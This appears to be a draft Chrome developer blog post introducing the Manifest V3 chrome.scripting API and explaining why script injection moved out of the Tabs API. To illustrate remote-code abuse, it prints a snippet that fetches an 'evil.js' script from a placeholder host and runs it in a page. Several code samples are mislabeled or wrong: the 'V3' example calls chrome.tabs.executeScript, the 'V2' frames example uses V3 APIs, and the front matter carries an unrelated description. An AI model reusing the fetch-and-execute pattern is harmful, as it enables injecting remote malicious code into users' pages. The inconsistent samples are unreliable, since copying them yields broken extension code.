---
title: "Introducing the chrome.scripting API"
# description: >
#   Why and how we implemented color vision deficiency simulation in DevTools and the Blink Renderer.
layout: "layouts/blog-post.njk"
authors:
  - dotproto
date: 2021-05-03
hero: 'image/dPDCek3EhZgLQPGtEG3y0fTn4v82/HD1U7BxDVRDcTxNaQJ4C.jpg'
alt: ''
tags:
  - extensions
---

Manifest V3 introduces a number of changes to Chrome's extension platform, a handful of which are
notable or significant changes. In this post, we'll be exploring the motivations and changes
introduced by one of the more notable changes: the introduction of the `chrome.scripting` API.

## What is `chrome.scripting`?

As the name might suggest, `chrome.scripting` is a new namespace introduced in Manifest V3
responsible for script and style injection capabilities.

Developers that have created Chrome extensions in the past may be familiar with Manifest V2 methods
on the Tabs API like `chrome.tabs.executeScript` and `chrome.tabs.insertCSS`. These methods allow
extensions to inject scripts and stylesheets into pages, respectively. In Manifest V3, these
capabilities have moved to `chrome.scripting` and we plan to expand this API with some new
capabilities in the future.

## Why create a new API?

With a change like this, one of the first questions that tends to come up is, "why?"

A few different factors lead to the Chrome team deciding to introduce a new namespace for scripting.
First, the Tabs API is a bit of a junk drawer for features. Second, we needed to make breaking
changes to the existing `executeScript` API. Third, we knew that we wanted to expand scripting
capabilities for extensions. Together, these concerns clearly defined a need for a new namespace to
house scripting capabilities.

### The junk drawer

One of the issues that has been bothering the Extensions Team for the past few years is that the
`chrome.tabs` API is overloaded. When this API was first introduced most of the capabilities it
provided were related to the broad concept of a browser tab. Even at that point, though, it was a
bit of a grab bag of features and over the years this collection has only grown.

[Image: a beautiful junk drawer. Caption: Artist's rendition of the Tabs API.]

By the time Manifest V3 was released, the Tabs API had grown to cover basic tab management,
selection management, window organization, messaging, zoom control, basic navigation,
scripting, and a few other smaller capabilities. While these are all important, it can be a bit
overwhelming for developers when they're getting started and for the Chrome team as we maintain the
platform and consider requests from the developer community.

Another complicating factor is that the `tabs` permission is not well understood. While many other
permissions restrict access to a given API (e.g. [`storage`][storage-api]), this permission is a bit
unusual in that it only grants the extension access to sensitive properties on Tab instances (and by
extension also impacts the Windows API). Understandably, many extension developers mistakenly think
they need this permission in order to access methods on the Tabs API like `chrome.tabs.create` or,
more germanely, `chrome.tabs.executeScript`. Moving functionality out of the Tabs API helps clear
up some of this confusion.

Manifest version bumps are a rare opportunity for us to address these kinds of abstract concerns. As we scoped out Manifest V3 and considered ways to iterate on the platform, we felt this transition was a great time to move scripting functionality to a new API and to narrow the scope of the existing Tabs API.

### Breaking changes

When designing Manifest V3, one of the major issues that we wanted to address was abuse and malware
enabled by "remotely hosted code." It's common for abusive extension authors to execute scripts
fetched from remote servers to steal user data, inject malware, and evade detection. While good
actors also use this capability, we ultimately felt that it was simply too dangerous to remain as it
was.

There are a couple different ways that extensions can execute unbundled code, but the relevant one
here is the Manifest V2 `chrome.tabs.executeScript` method. This method allows an extension to
execute an arbitrary string of code in a target tab. This, in turn, means that a malicious developer
can fetch an arbitrary script from a remote server and execute it inside any page the extension can
access. We knew that if we wanted to address the remote code problem that we would have to drop this
feature.

```js
let result = await fetch('https://example.com/evil.js');
let script = await result.text();
chrome.tabs.executeScript({
  code: script,
});
```

We also wanted to clean up some other, more subtle footguns with the Manifest V2 version's design,
like as the `matchAboutBlank` property on the options object.

While we could have changed the signature of this method within the Tabs API, we felt that between
these breaking changes and the introduction of new capabilities (covered in the next section) a
clean break would be easier for everyone.

### Expanding scripting capabilities

Another consideration that fed into the Manifest V3 design process was a desire to introduce
additional scripting capabilities to Chrome's extension platform. Specifically, we wanted to add
support for declarative content scripts and to expand the capabilities of the `executeScript`
method.

Declarative content scripts support has been an outstanding Chromium feature request for several
years. Today, Manifest V2 and V3 Chrome extensions can only statically declare content scripts in
their manifest.json file; the platform doesn't provide a way to register new content scripts, tweak
content script registration, or unregister content scripts at runtime.

While we knew that we wanted to tackle this feature request in Manifest V3, none of our existing
APIs felt like the right home. We also considered aligning with Firefox on their [Content Scripts
API][content-scripts], but very early on we identified a couple major drawbacks to this approach.
First, we knew that we would have incompatible signatures (e.g. dropping`code` support). Second, our
API had a different set of design constraints (e.g. needing a registration to persist beyond a
service worker's lifetime). Finally, this namespace would also pigeonhole us to content script
functionality where we're thinking about scripting in extensions more broadly.

On the executeScript front, we also wanted to expand what this API could do beyond what the Tabs API version supported. More specifically, we wanted to support functions and arguments, more easily target specific frames, and target non-"tab" contexts.

## Changes in Manifest V3

In the previous section I mentioned that we're planning to add dynamic content script support. While
I'd love to dig more into what this might look like or how it might work, design goals, or
capabilities, unfortunately we're not quite ready to share those details.

In the remainder of this post, I'd like to take a closer look at the similarities and differences between `chrome.tabs.executeScript` and `chrome.scripting.executeScript`.

While considering how the platform would need to evolve in light of remotely hosted code
restrictions, we wanted to find a balance between the raw power of arbitrary code execution and only
allowing static content scripts. The solution we struck on was to allow extensions to inject a
function as a content script and to pass an array of values as arguments.

Let's take a quick look at an (oversimplified) example. Say we wanted to inject a script that
greeted the user by name when the user clicks the extension's action button (icon in the toolbar).
In Manifest V2, we could dynamically construct a code string and execute that script in the current
page.

```js
// Manifest V2 extension
let givenName = "Default";
chrome.browserAction.onClicked.addListener((tab) => {
  chrome.tabs.executeScript({
    code: `alert(\`Hello, ${givenName}\`)`
  });
});
```

While Manifest V3 extensions can't use code that isn't bundled with the extension, our goal was to
preserve some of the dynamism that arbitrary code blocks enabled for Manifest V2 extensions. The
function and arguments approach makes it possible for Chrome Web Store reviewers, users, and other
interested parties to more accurately assess the risks an extension poses while also allowing
developers to modify an extension's runtime behavior based on user settings or application state.

```js
// Manifest V3 extension
let givenName = "Default";

function greetUser(name) {
  alert(`Hello, ${name}`);
}
chrome.action.onClicked.addListener((tab) => {
  chrome.tabs.executeScript({
    target: { tabId: tab.id },
    func: greetUser,
    args: [givenName],
  });
});
```

We also wanted to make frames more of a first-class citizen of the API. The Manifest V2 version of
`executeScript` allowed developers to target either all frames in a tab or a specific frame in the
tab. In Manifest V3, we replaced the optional `frame` string property in the options object with an
optional `frames` array of strings.


```js
// Manifest V2 extension
chrome.action.onClicked.addListener((tab) => {
  chrome.scripting.executeScript({
    target: { tabId: tab.id, frame: targetFrame1 },
    files: ["content-script.js"],
  });
  chrome.scripting.executeScript({
    target: { tabId: tab.id, frame: targetFrame2 },
    files: ["content-script.js"],
  });
});
```

```js
// Manifest V3 extension
chrome.action.onClicked.addListener((tab) => {
  chrome.scripting.executeScript({
    target: { tabId: tab.id, frames: [targetFrame1, targetFrame2] },
    files: ["content-script.js"],
  });
});
```

We've also improved the way we return script injection results in Manifest V3. In Manifest V2,
`executeScript` would return an array of results. Unfortunately, this implementation didn't provide
enough information about which frame a given result applied to,  which meant that if an error occurred when injecting into `allFrames: true` it was very difficult to track down which frame had the error.

In Manifest V3, we've added more details to the result objects returned in order to clearly
identify the tab and frame that the injection occurred. This makes it much easier for developers to
identify and react to situations where injection fails unexpectedly.

Moving forward, we're also considering how extensions can interact with installed PWAs and other
contexts that don't conceptually map to "tabs."

[storage-api]: #link-to-storage-api-docs
[content-scripts]: https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Content_scripts
